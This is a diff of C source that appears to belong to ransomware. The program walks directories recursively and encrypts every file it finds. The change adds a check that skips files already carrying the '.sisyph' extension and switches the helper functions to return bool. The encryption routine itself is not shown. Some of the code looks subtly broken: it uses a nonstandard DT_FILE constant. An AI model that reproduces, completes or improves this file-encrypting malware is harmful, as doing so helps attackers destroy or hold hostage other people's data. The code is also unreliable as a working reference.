@@ -15,17 +15,17 @@ void encrypt_file(char *path);
 
 
 
-int is_file(struct dirent *entry) {
+bool is_file(struct dirent *entry) {
     return (entry->d_type == DT_FILE);
 }
 
 
-int is_dir(struct dirent *entry) {
+bool is_dir(struct dirent *entry) {
     return (entry->d_type == DT_DIR);
 }
 
 
-int is_inode(struct dirent *entry) {
+bool is_inode(struct dirent *entry) {
     return (
         (!strncmp(entry->d_name, ".", 1) && strlen(entry->d_name) == 1) ||
         (!strncmp(entry->d_name, "..", 2) && strlen(entry->d_name) == 2)
@@ -33,8 +33,14 @@ int is_inode(struct dirent *entry) {
 }
 
 
-int is_root(char *path) {
+bool is_root(char *path) {
     return (strlen(path) == 1 && strncmp(path, "/", 1) == 0);
+}
+
+
+bool already_encrypted(char *path) {
+    /* CRYPT_EXT it is '.sisyph' */
+    return strstr(path, CRYPT_EXT);
 }
 
 
@@ -67,7 +73,13 @@ int listdir(char *name, int depth) {
         strcat(path, "/");
         strcat(path, entry->d_name);
 
-        if (is_inode(entry)) {
+        if (already_encrypted(path)) {
+#ifdef DEBUG
+            printf("Encrypted: '%s'\n", path);
+#endif
+            continue;
+        }
+        else if (is_inode(entry)) {
 #ifdef DEBUG
             printf("Node: %s\n", path);
 #endif
@@ -81,7 +93,7 @@ int listdir(char *name, int depth) {
         }
         else if (is_file(entry)) {
 #ifdef DEBUG
-            printf("encrypt: File: '%s'\n", path);
+            printf("File: '%s'\n", path);
 #endif
             encrypt_file(path);
         }
